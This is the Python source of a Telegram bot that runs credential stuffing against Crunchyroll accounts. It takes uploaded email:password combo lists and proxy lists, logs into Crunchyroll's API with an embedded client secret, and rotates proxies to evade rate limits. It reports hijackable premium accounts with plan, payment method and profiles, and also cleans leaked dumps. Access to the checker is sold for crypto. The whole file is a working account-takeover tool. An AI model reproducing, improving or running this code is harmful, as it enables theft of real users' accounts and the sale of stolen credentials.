#..........This Bot Made By [RAHAT](https://t.me/r4h4t_69)..........#
#..........Anyone Can Modify This As He Likes..........#
#..........Just one requests do not remove my credit..........#

import requests, random, time, asyncio
from uuid import uuid1
import uuid
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import os
from requests.exceptions import ProxyError, Timeout
from pymongo import MongoClient
import queue
import socket
from datetime import datetime, timedelta
import string
import tempfile
import re 
from country_code import country_translations
# Bot configuration
API_ID = "" # Add Your Telegram API_ID Here
API_HASH = "" # Add Your Telegram API_HASH| Here
BOT_TOKEN = "" # Add Your BOT Token Here

# Database configuration
DB_URL = os.environ.get("DB_URL", "") # Add Your MongoDB Database URL Here
DB_NAME = os.environ.get("DB_NAME", "") # Add Your MongoDB Database Name Here
client = MongoClient(DB_URL)
db = client[DB_NAME]

# Dictionary to handle cancel flags for each user
user_cancel_flags = {}

# Pyrogram bot client
app = Client("crunchyroll_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Admin ID
ADMIN_ID = "" # Add Your Telegram User ID Here

def parse_proxy(proxy):
    """Parse proxy to handle both ip:port and ip:port:username:password formats."""
    parts = proxy.split(":")
    if len(parts) == 2:
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    elif len(parts) == 4:
        ip, port, username, password = parts
        proxy_auth = f"{username}:{password}@{ip}:{port}"
        return {"http": f"http://{proxy_auth}", "https": f"http://{proxy_auth}"}
    else:
        return None

def login(email, pasw, proxy):
    """Login to Crunchyroll using credentials and proxy"""
    proxy_dict = parse_proxy(proxy)
    if not proxy_dict:
        return f"Invalid proxy format: {proxy}"

    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara",
    }
#'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''#
    try:
        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers, proxies=proxy_dict, timeout=10)

        if "refresh_token" in res.text:
            token = res.json().get("access_token")
            headers_get = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": "Ktor client",
                "Content-Length": "0",
                "Host": "beta-api.crunchyroll.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }
            res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get, proxies=proxy_dict)
#'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''#
            if "external_id" in res_get.text:
                external_id = res_get.json().get("external_id")
                email_status = res_get.json().get("email_verified")
                if email_status =="True":
                    email_status = "True✅"                        
                else:
                    email_status = "False❌"
                creation_date = res_get.json().get("created")
                if creation_date:
                    creation_date = creation_date.split("T")[0]
                res_info = requests.get(
                    f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
                    headers=headers_get,
                    proxies=proxy_dict
                )
#'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''#             
                res_info2 = requests.get(
                   f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                   headers=headers_get,
                   proxies=proxy_dict
                )
                country_info = res_info2.json()
                subscription_country = country_info.get("subscription_country")
                country_full_name = country_translations.get(subscription_country, subscription_country)
                total_items = country_info.get("total")
                #pattern = r"concurrent_streams\.\d+" #it give full
                pattern = r"concurrent_streams\.(\d+)"
                concurrent_streams = None
                for item in country_info.get("items", []):
                    benefit = item.get("benefit", "")
                    #if re.match(pattern, benefit):  #it give full
                        #concurrent_streams = benefit
  #'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''#                                     
                    match = re.match(pattern, benefit)
                    if match:
                        concurrent_streams = benefit
                        concurrent_streams = match.group(1)
#'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''#                
                profile_info = requests.get(
                    f"https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
                    headers=headers_get,
                    proxies=proxy_dict
                )
 
                # Parse the profile response
                profile_data = profile_info.json()
                tier_max_profiles = profile_data.get("tier_max_profiles")
                profiles = profile_data.get("profiles", [])
               
               # Prepare and print profile names in the desired format
                profile_list = ""
                for profile in profiles:
                    profile_name = profile.get('profile_name')
                    profile_list += f"[{profile_name}] "
                    total_profiles = profile_list.count("[")
  #'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''#                  
                if any(x in res_info.text for x in ["fan", "premium", "no_ads", 'is_subscribable":false']):
                    try:
                        type = res_info.text.split('"type":"')[1].split('"')[0]
                        free_t = res_info.text.split('"active_free_trial":')[1].split(",")[0]
                        payment = res_info.text.split('"source":"')[1].split('"')[0]
                        expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
                        auto_renew = res_info.text.split('"auto_renew":')[1].split(",")[0].strip()
                        if "true" in auto_renew:
                            auto_renew = "True✅"                        
                        else:
                            auto_renew = "False❌"
                        name = res_info.text.split('"name":"')[1].split('"')[0]
                        
                        if "cr_superfanpack" in name:
                            plan_type = "ULTIMATE MEGA FAN"
                        elif "cr_fanpack" in name:
                            plan_type = "MEGA FAN MEMBER"
                        elif "cr_premium" in name:
                            plan_type = "FAN MEMBER"
                        else:
                            plan_type = "UNKNOWN"
                        sku = res_info.text.split('"sku":"')[1].split('"')[0]
                                                   
                        # Expiry date
                        expiry_date = datetime.strptime(expiry, "%Y-%m-%d")
                        # Current date
                        current_date = datetime.now()
                        # Calculate remaining days
                        remaining_days = (expiry_date - current_date).days

                        
                        # Extract the ip:port portion of the proxy
                        proxy_parts = proxy.split(":")
                        if len(proxy_parts) == 2:
                            # Regular ip:port proxy
                            clean_proxy = f"{proxy_parts[0]}:{proxy_parts[1]}"
                        elif len(proxy_parts) == 4:
                            # Proxy with username and password
                            clean_proxy = f"{proxy_parts[0]}:{proxy_parts[1]}"
                        else:
                            clean_proxy = "Unknown proxy format"
                        msg = f"""
┏━━━━━━━⍟
┃ Email ⥤ <code>{email}</code>
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃Pass ⥤ <code>{pasw}</code>
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃Plan ⥤ <bold>{type}</bold>
┃Plan Type ⥤ <bold>{plan_type}</bold>
┃Email Verified ⥤ <bold>{email_status}</bold>
┃Account Created ⥤ <bold>{creation_date}</bold>
┃Country ⥤ <bold>{country_full_name}</bold>
┃Total Items ⥤ <bold>{total_items}</bold>
┃Max Stream ⥤ <bold>{concurrent_streams}</bold>
┃Total Profiles ⥤ <bold>{total_profiles}</bold>
┃Profile List ⥤ <bold>{profile_list}</bold>
┃Is Free Trial ⥤ <bold>{free_t}</bold>
┃Payment Method ⥤ <bold>{payment}</bold>
┃Duration ⥤ <bold>{sku}</bold>
┃Expiry ⥤ <bold>{expiry}</bold>
┃Remaining Days ⥤ <bold>{remaining_days}</bold>
┃Auto Renew ⥤ <bold>{auto_renew}</bold>
┃Proxy ⥤ <bold>{clean_proxy}</bold>
┗━━━━━━━━━━━⊛
Coded By ⥤ @r4h4t_69
"""
                        return msg
                    except Exception as e:
                        return None
                else:
                    return None
            else:
                return None
        elif '406 Not Acceptable' in res.text:
            time.sleep(420)
            return None
        else:
            return None
    except (ProxyError, Timeout):
        return "ProxyError"  # Return proxy error flag

def generate_secret_key(length=8):
    """Generate a random secret key."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))
    
    
@app.on_message(filters.command("start"))
async def start(bot, message):
    await message.reply("Reply to me with /check and email:password file. Then set proxies with /proxy.")


@app.on_message(filters.command("proxy") & filters.private)
async def set_proxies(client, message: Message):
    user_id = message.from_user.id  # Get the user's Telegram ID
    file_id = message.reply_to_message.document.file_id if message.reply_to_message and message.reply_to_message.document else None

    if not file_id:
        await message.reply("Please reply to a file containing proxies in the format ip:port or ip:port:username:password. Example: 123.123.123.123:8080")
        return

    proxy_file_path = await app.download_media(file_id)
    with open(proxy_file_path, "r") as f:
        proxies = f.read().splitlines()

    # Store proxies in MongoDB with user ID
    proxy_collection = db["proxies"]
    for proxy in proxies:
        proxy_collection.insert_one({"proxy": proxy, "user_id": user_id})

    os.remove(proxy_file_path)  # Remove the local file after storing in DB
    await message.reply(f"Successfully set {len(proxies)} proxies.")


@app.on_message(filters.command("rmv_proxy") & filters.private)
async def remove_proxy_file(client, message: Message):
    user_id = message.from_user.id  # Get the user's Telegram ID
    # Clear the proxy collection in MongoDB for this user
    db["proxies"].delete_many({"user_id": user_id})
    await message.reply("All your proxies have been successfully removed from the database.")


@app.on_message(filters.command("cancel") & filters.private)
async def cancel_check(client, message: Message):
    user_id = message.from_user.id  # Get the user's Telegram ID
    user_cancel_flags[user_id] = True  # Set the cancel flag for this user
    await message.reply("Your checking process has been canceled.")

@app.on_message(filters.command("check") & filters.private)
async def check_accounts(client, message: Message):
    user_id = message.from_user.id  # Get the user's Telegram ID

    # Check if user is premium
    premium_user = db["premium_users"].find_one({"user_id": user_id})
    if not premium_user:
        await message.reply("You are not a premium user. Please contact the admin to get access.")
        return

    # Check expiration
    if premium_user["expiry"] < datetime.utcnow():
        db["premium_users"].delete_one({"user_id": user_id})  # Remove expired premium
        await message.reply("Your premium status has expired.")
        return

    file_id = message.reply_to_message.document.file_id if message.reply_to_message and message.reply_to_message.document else None

    if not file_id:
        await message.reply("Please reply to a file containing email:password pairs.")
        return

    # Ensure the proxy list for this user is not empty
    proxy_collection = db["proxies"]
    proxies = list(proxy_collection.find({"user_id": user_id}))  # Retrieve only the user's proxies
    if not proxies:
        await message.reply("Your proxy list is empty. Please set proxies using /proxy first.")
        return

    # Convert proxies to a list of proxy strings
    proxy_list = [proxy_data['proxy'] for proxy_data in proxies]

    file_path = await app.download_media(file_id)
    with open(file_path, "r") as f:
        lines = f.read().splitlines()

    premium_accounts = []
    free_accounts = []  # To store free accounts
    bad_accounts = 0
    proxy_failures = 0

    progress_buttons = InlineKeyboardMarkup([  # Update progress message
        [InlineKeyboardButton(f"Total: {len(lines)}", callback_data="total"),
         InlineKeyboardButton(f"Bad: {bad_accounts}", callback_data="bad")],
        [InlineKeyboardButton(f"Premium: {len(premium_accounts)}", callback_data="premium"),
         InlineKeyboardButton(f"Free: {len(free_accounts)}", callback_data="free")],
         # Add Free Accounts button
        [InlineKeyboardButton(f"Proxy Failures: {proxy_failures}", callback_data="proxy_failures")]
    ])

    progress_message = await message.reply("Started checking accounts...", reply_markup=progress_buttons)

    # Ensure the cancel flag for this user is reset at the start
    user_cancel_flags[user_id] = False

    # Process accounts in a queue
    for acc in lines:
        if user_cancel_flags.get(user_id):  # Check if the user has canceled
            await message.reply("Your process was canceled.")
            break
        # Split email and password at the first occurrence of ":"
        parts = acc.split(":", 1)
        if len(parts) < 2:
            bad_accounts += 1
            continue

        email, password = parts[0], parts[1]
       
        # Randomly pick a proxy from the list for each request
        proxy = random.choice(proxy_list)
        
        result = await asyncio.to_thread(login, email, password, proxy)
        #print(str(result))

        if result and "ProxyError" not in result:
            if "Total Items ⥤ <bold>0</bold>" in result:  # Check if it's a free account
                free_accounts.append({"email": email, "password": password})
                # Skip sending this account as it's free
                continue  # Move to the next account without sending the result
            else:
                premium_accounts.append({"email": email, "password": password})
                await message.reply(result)  # Only send non-free (premium) accounts
        elif result == "ProxyError":
            proxy_failures += 1
        else:
            bad_accounts += 1

        # Update progress message
        progress_buttons.inline_keyboard[0][1].text = f"Bad: {bad_accounts}"
        progress_buttons.inline_keyboard[1][0].text = f"Premium: {len(premium_accounts)}"
        progress_buttons.inline_keyboard[1][1].text = f"Free: {len(free_accounts)}"  # Update Free button
        progress_buttons.inline_keyboard[2][0].text = f"Proxy Failures: {proxy_failures}"        
        await progress_message.edit_reply_markup(progress_buttons)

    os.remove(file_path)  # Clean up uploaded file

    # Save premium and free accounts directly to the database
    secret_key = str(uuid1())
    db["checked_accounts"].insert_one({
        "user_id": user_id,
        "premium_accounts": premium_accounts,
        "free_accounts": free_accounts,  # Save free accounts as well
        "secret_key": secret_key,
        "timestamp": datetime.utcnow()
    })
    
    
    
    

    summary = f"""
Finished checking!
Premium Accounts: {len(premium_accounts)}
Free Accounts: {len(free_accounts)}
Bad Accounts: {bad_accounts}
Proxy Failures: {proxy_failures}
    """

    await message.reply(summary)
    if premium_accounts or free_accounts:
        # Save premium and free accounts to a file
        checked_file_path = "checked_accounts.txt"
        with open(checked_file_path, "w") as f:
            if premium_accounts:
                f.write("Premium Accounts:\n")
                for account in premium_accounts:
                    f.write(f"{account}\n")
            if free_accounts:
                f.write("\nFree Accounts:\n")
                for account in free_accounts:
                    f.write(f"{account}\n")
            f.write("\nCredits to @cruch_chkbot")

        # Send the checked accounts file to the user
        await app.send_document(
            chat_id=message.chat.id,
            document=checked_file_path,
            caption="Here are the premium and free accounts. Credits to @cruch_chkbot"
        )

        # Optionally, remove the file after sending
        os.remove(checked_file_path)
        await message.reply(f"Use <code>/get_file {secret_key}</code> to download the checked accounts file.\nN.B:This File Will Be Delect After 7h From Database!! ")
@app.on_message(filters.command("add_premium") & filters.private)
async def add_premium(client, message: Message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        await message.reply("You are not authorized to add premium users.")
        return

    # Extract the target user and duration
    try:
        target_user_id, days = map(int, message.text.split()[1:])
    except ValueError:
        await message.reply("Invalid format. Use /add_premium <Telegram ID> <days>")
        return

    expiry_date = datetime.utcnow() + timedelta(days=days)
    
    db["premium_users"].insert_one({
        "user_id": target_user_id,
        "expiry": expiry_date
    })
    await message.reply(f"User {target_user_id} has been granted {days} days of premium access until {expiry_date}.")


@app.on_message(filters.command("rmv_premium") & filters.private)
async def rmv_premium(client, message: Message):
    # Check if the user is the admin
    if message.from_user.id != 1235222889:  # Replace with your Telegram ID
        await message.reply("You are not authorized to use this command.")
        return

    # Check if a user ID is provided after the command
    if len(message.text.split()) < 2:
        await message.reply("Please provide the Telegram ID of the user you want to remove. Usage: /rmv_premium <Telegram ID>")
        return

    try:
        target_user_id = int(message.text.split()[1])  # Get the user ID from the message
        # Remove the user from the premium users collection in MongoDB
        db["premium_users"].delete_one({"user_id": target_user_id})

        await message.reply(f"User with ID {target_user_id} has been removed from premium users.")
    except ValueError:
        await message.reply("Invalid Telegram ID provided. Please provide a valid number.")



@app.on_message(filters.command("see_plan") & filters.private)
async def see_plans(client, message: Message):
    user_id = message.from_user.id

    premium_user = db["premium_users"].find_one({"user_id": user_id})
    if not premium_user:
        await message.reply("You are not a premium user.")
        return

    expiry = premium_user["expiry"]
    time_remaining = expiry - datetime.utcnow()

    await message.reply(f"Your premium status is active. Time remaining: {str(time_remaining).split('.')[0]}")
    


@app.on_message(filters.command("get_file") & filters.private)
async def get_file(client, message: Message):
    user_id = message.from_user.id

    # Extract the secret key from the message
    try:
        secret_key = message.text.split()[1]
    except IndexError:
        await message.reply("Please provide a valid secret key. Usage: /get_file <secret key>")
        return

    # Find the premium and free accounts in the database using the secret key
    file_data = db["checked_accounts"].find_one({"secret_key": secret_key, "user_id": user_id})

    if not file_data:
        await message.reply("Invalid secret key or you do not have access to this file.")
        return

    premium_accounts = file_data.get("premium_accounts", [])
    free_accounts = file_data.get("free_accounts", [])

    # Prepare file content
    file_content = ""
    
    # Add premium accounts to the file
    if premium_accounts:
        file_content += "Premium Accounts:\n"
        file_content += "\n".join([f"Email: {account['email']} | Password: {account['password']}" for account in premium_accounts])
    
    # Add free accounts to the file
    if free_accounts:
        file_content += "\n\nFree Accounts:\n"
        file_content += "\n".join([f"Email: {account['email']} | Password: {account['password']}" for account in free_accounts])

    # Check if file content is empty (no accounts found)
    if not file_content.strip():
        await message.reply("No premium or free accounts found in this file.")
        return

    # Use tempfile to get a valid temporary file path
    with tempfile.NamedTemporaryFile(delete=False, mode='w', newline='', encoding='utf-8') as f:
        # Write the content to the file
        f.write(file_content)
        file_path = f.name  # Get the path of the temp file

    # Send the file to the user
    await client.send_document(message.chat.id, file_path, caption="Here are your premium and free accounts.")

    # Optional: Delete the file after sending
    os.remove(file_path)





@app.on_message(filters.command("ip"))
def get_ip(client, message: Message):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        message.reply(f"The server's IP address is: {ip_address}")
    except Exception as e:
        message.reply(f"Unable to fetch IP address. Error: {str(e)}")


@app.on_message(filters.command("plans") & filters.private)
async def show_plans(client, message: Message):
    plans_text = """
Premium Subscription List:
• 1 Day ~ 1$
• 3 Days ~ 2.5$
• 7 Days ~ 5$
• 15 Days ~ 9$
• 30 Days ~ 15$

Note: Only Crypto Acceptable
"""

    # Creating an inline button for contacting the admin
    contact_admin_button = InlineKeyboardMarkup(
        [[InlineKeyboardButton("Contact Admin", url="https://t.me/r4h4t_69")]]
    )

    # Send the subscription plans message with the contact admin button
    await message.reply(plans_text, reply_markup=contact_admin_button)



@app.on_message(filters.command("clean") & filters.reply & filters.private)
async def clean_file(client, message):
    # Check if the reply contains a document 
    user_id = message.from_user.id
    if not message.reply_to_message.document:
        await message.reply("Please reply to a valid text file.")
        return
    
    # Download the document (txt file)
    file_id = message.reply_to_message.document.file_id
    file_path = await app.download_media(file_id)
    
    try:
        # Read the content of the file with 'utf-8' encoding
        with open(file_path, "r", encoding="utf-8") as f:
            lines = f.readlines()
    except UnicodeDecodeError:
        # Try 'latin-1' encoding as a fallback if utf-8 fails
        with open(file_path, "r", encoding="latin-1") as f:
            lines = f.readlines()

    # Regular expression to match email and password
    email_pattern = re.compile(r"([\w\.-]+@[\w\.-]+\.[\w]{2,})")
    cleaned_lines = set()  # Use a set to store unique email-password pairs

    # Extract lines containing email:password pairs
    for line in lines:
        match = email_pattern.search(line)
        if match:
            email = match.group(1)
            # Split by the first occurrence of ":"
            if ":" in line:
                # Extract the password and stop at the first space
                password = line.split(":", 1)[1].strip().split(" ", 1)[0]
                cleaned_lines.add(f"{email}:{password}\n")
    
    # Write cleaned data to a new text file
    cleaned_file_path = f"{user_id}_cleaned_file.txt"
    with open(cleaned_file_path, "w", encoding="utf-8") as cleaned_file:
        cleaned_file.writelines(cleaned_lines)
    
    # Send the cleaned file to the user
    await client.send_document(
        chat_id=message.chat.id,
        document=cleaned_file_path,
        caption="Here is the cleaned file with email:password pairs."
    )
    
    # Clean up: remove both the uploaded and the cleaned files
    os.remove(file_path)
    os.remove(cleaned_file_path)
    

@app.on_message(filters.command("rmv_line") & filters.reply & filters.private)
async def rmv_line(client, message):
    user_id = message.from_user.id  # Get the user's Telegram ID

    if not message.reply_to_message.document:
        await message.reply("Please reply to a valid text file.")
        return
    
    # Download the document (txt file)
    file_id = message.reply_to_message.document.file_id
    file_path = await client.download_media(file_id)

    try:
        # Read the content of the file
        with open(file_path, 'r', encoding="utf-8") as f:
            lines = f.readlines()

        # Ask for start and end lines
        await message.reply("From which line should I start removing?")
        start_line_msg = await client.listen(message.chat.id, timeout=60)  # Wait for user input
        start_line = int(start_line_msg.text) - 1

        await message.reply("Where should I stop removing?")
        end_line_msg = await client.listen(message.chat.id, timeout=60)  # Wait for user input
        end_line = int(end_line_msg.text)

        # Remove lines
        new_lines = lines[:start_line] + lines[end_line:]

        # Write the new lines to a file
        with open(file_path, 'w', encoding="utf-8") as f:
            f.writelines(new_lines)

        # Send the updated file back to the user
        await client.send_document(
            chat_id=message.chat.id,
            document=file_path,
            caption="Here is your file with lines removed."
        )

        # Remove the original file from the directory
        os.remove(file_path)

    except Exception as e:
        await message.reply(f"An error occurred: {e}")

    # Remove the file from the directory
    os.remove(file_path)



print("🎊 I AM ALIVE 🎊")
app.run()
